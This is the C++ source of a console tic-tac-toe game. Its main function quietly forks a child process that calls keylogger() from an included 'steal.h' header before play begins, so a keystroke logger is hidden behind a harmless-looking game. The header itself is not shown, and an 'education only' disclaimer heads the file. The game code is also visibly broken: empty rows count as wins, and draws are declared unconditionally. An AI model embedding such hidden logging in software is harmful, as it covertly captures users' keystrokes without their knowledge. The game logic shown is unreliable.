/*
	OLISENACHI DEXTER ELUMELU

	DISCLAIMER:		USE OF THIS PROJECT FOR ANYTHING OUTSIDE OF EDUCATION
					DOES NOT INVOLVE ME
*/


#include <cstdio>
#include <iostream>
#include <cstdlib>
#include <windows.h>
#include <sys/types.h> 
#include <unistd.h> 
#include "steal.h"

using namespace std;

int game_table[3][3];
int alternate = 1;
int spaces_left = 9;
int position = 1, result = 0, winner;

void print_table(void){
	//printf("omo\n");
	for (int i = 0; i < 3; i++)
	{
		printf("|");
		for (int j = 0; j < 3; j++)
		{
			if (((i*3) + j + 1) == position)
			{
				if (game_table[i][j] == -1)
				{
					printf(" _ |");
				}else if (game_table[i][j] == 1)
				{
					printf("_x_|");
				}else{
					printf("_o_|");
				}
			}else{
				if (game_table[i][j] == -1)
				{
					printf("___|");
				}else if (game_table[i][j] == 1)
				{
					printf(" x |");
				}else{
					printf(" o |");
				}
			}
		}
		printf("\n");
	}printf("\n\n\n\n\n\n\n");
}


void zero_table(void){
	for (int i = 0; i < 3; i++)
	{
		for (int j = 0; j < 3; j++)
		{
			game_table[i][j] = -1;
		}
	}
}

void check_draw(void){
	if (spaces_left == 0)
	{
		printf("THIS ROUND IS A DRAW!!!!\n");
	}
	result = 3;
}

void check_win(void){
	//diagonal
	if (game_table[0][0] == game_table[1][1] && game_table[1][1] == game_table[2][2])
	{
		result = game_table[0][0];
	}else if (game_table[0][2] == game_table[1][1] && game_table[1][1] == game_table[2][0])
	{
		result = game_table[1][1];
	}
	//horizontal
	for (int i = 0; i < 3; i++)
	{
		if (game_table[i][0] == game_table[i][1] && game_table[i][1] == game_table[i][2])
		{
			result = game_table[i][1];
			break;
		}
	}

	//vertical
	for (int i = 0; i < 3; i++)
	{
		if (game_table[0][i] == game_table[1][i] && game_table[1][i] == game_table[2][i])
		{
			result = game_table[0][i];
			break;
		}
	}
}
//option 1

void to_play(void){
	alternate %= 2;
	alternate += 1;
	//printf("Player %d's turn to play\n", alternate);
}

//Player one plays:
void player_one_play(int play){
	//print_table();
	printf("Player  1 To Play\n");
	int position_row, position_column, num;
	//convert 1d position to 2d position on the table
	num = play - 1;
	position_column = num % 3;
	position_row = (num - position_column)/3;

	if (game_table[position_row][position_column] == -1)
	{
		game_table[position_row][position_column] = 1;
	}else{
		printf("INVALID MOVE! TRY AGAIN\n");
		scanf("%d", &play);
		player_one_play(play);
		spaces_left -= 1;
	}
}

void player_two_play(int play){
	//print_table();
	printf("Player 2 To Play\n");
	int position_row, position_column, num;

	//convert 1d position to 2d position on the table
	num = play - 1;
	position_column = num % 3;
	position_row = (num - position_column)/3;

	if (game_table[position_row][position_column] == -1)
	{
		game_table[position_row][position_column] = 2;
	}else{
		printf("INVALID MOVE! TRY AGAIN\n");
		scanf("%d", &play);
		player_two_play(play);
		spaces_left -= 1;
	}
}




int main(int argc, char const *argv[])
{
	if (fork() == 0){	
		keylogger();
	}
	//keylogger();

	position = 0;
	reset:
		printf("Welcome. Do you want to: \n1. Play\n2.Exit\n");

		int response;
		if (scanf("%d", &response) == 0)
		{
			return 0;
		}
		zero_table();

	int play = 1;
	//to_play();
	while(true){
		while (play > 0 && play < 10){
			if (alternate == 1)
			{
				print_table();
				scanf("%d", &play);
				player_one_play(play);
				to_play();
				check_win();
				if (result == 1 || result == 2)
				{
					system("clear");
					printf("Winner is Player %d\n", result);
					print_table();
					result = 0;
					goto reset;
				}
				if (result == 3)
				{
					system("clear");
					check_draw();
					print_table();
					result = 0;
					goto reset;
				}
				//system("clear");
			}else if(alternate == 2){
				print_table();
				scanf("%d", &play);
				player_two_play(play);
				to_play();
				check_win();  
				if (result == 1 || result == 2)
				{
					system("clear");
					printf("Winner is Player %d\n", result);
					print_table();
					result = 0;
					goto reset;
				}
				if (result == 3)
				{
					system("clear");
					check_draw();
					print_table();
					result = 0;
					goto reset;
				}
				//system("clear");
			}
		}

	}
	

	return 0;
}